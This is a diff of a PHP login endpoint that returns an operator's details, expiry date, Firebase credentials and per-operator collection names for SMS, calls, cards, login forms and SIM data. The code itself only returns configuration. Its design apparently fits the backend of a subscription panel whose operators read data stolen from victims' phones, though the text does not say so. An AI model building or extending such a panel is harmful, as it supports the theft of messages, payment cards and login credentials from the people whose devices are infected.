@@ -84,23 +84,39 @@ try {
         exit;
     }
 
-    // Success response with assigned Firebase parameters
+    // Success response with assigned Firebase parameters & collection mappings
     echo json_encode([
         'success' => true,
         'operator' => [
-            'id' => (string)$operator['id'],
+            'id'       => (string)$operator['id'],
             'username' => $operator['username'],
-            'email' => $operator['email'],
+            'email'    => $operator['email'],
             'fullName' => $operator['full_name'],
-            'role' => $operator['role'],
+            'role'     => $operator['role'],
             'expiryDate' => $expiryDate,
+            // Firebase credentials
+            'firebaseProject'     => $operator['firebase_project_id'],
+            'firebaseApiKey'      => $operator['firebase_api_key'] ?? '',
+            'firebaseDatabaseUrl' => $operator['firebase_database_url'] ?? '',
+            'firebaseAuthDomain'  => $operator['firebase_auth_domain'] ?? "{$operator['firebase_project_id']}.firebaseapp.com",
+            'storageBucket'       => $operator['storage_bucket'] ?? "{$operator['firebase_project_id']}.appspot.com",
+            'appId'               => $operator['app_id'] ?? '',
+            'orgId'               => $operator['org_id'],
+            // Collection mappings (preset saved per-operator)
+            'collectionSms'   => $operator['collection_sms']   ?? 'user_sms',
+            'collectionCalls' => $operator['collection_calls'] ?? 'calls',
+            'collectionCards' => $operator['collection_cards'] ?? 'Card',
+            'collectionForms' => $operator['collection_forms'] ?? 'login',
+            'collectionSims'  => $operator['collection_sims']  ?? 'user_data',
+            // Legacy nested format for backward compat
             'firebaseConfig' => [
-                'projectId' => $operator['firebase_project_id'],
-                'apiKey' => $operator['firebase_api_key'] ?? 'AIzaSyDefaultKey',
-                'authDomain' => $operator['firebase_auth_domain'] ?? "{$operator['firebase_project_id']}.firebaseapp.com",
+                'projectId'     => $operator['firebase_project_id'],
+                'apiKey'        => $operator['firebase_api_key'] ?? '',
+                'databaseURL'   => $operator['firebase_database_url'] ?? '',
+                'authDomain'    => $operator['firebase_auth_domain'] ?? "{$operator['firebase_project_id']}.firebaseapp.com",
                 'storageBucket' => $operator['storage_bucket'] ?? "{$operator['firebase_project_id']}.appspot.com",
-                'appId' => $operator['app_id'] ?? '1:109823746501:web:default',
-                'orgId' => $operator['org_id']
+                'appId'         => $operator['app_id'] ?? '',
+                'orgId'         => $operator['org_id'],
             ]
         ]
     ]);
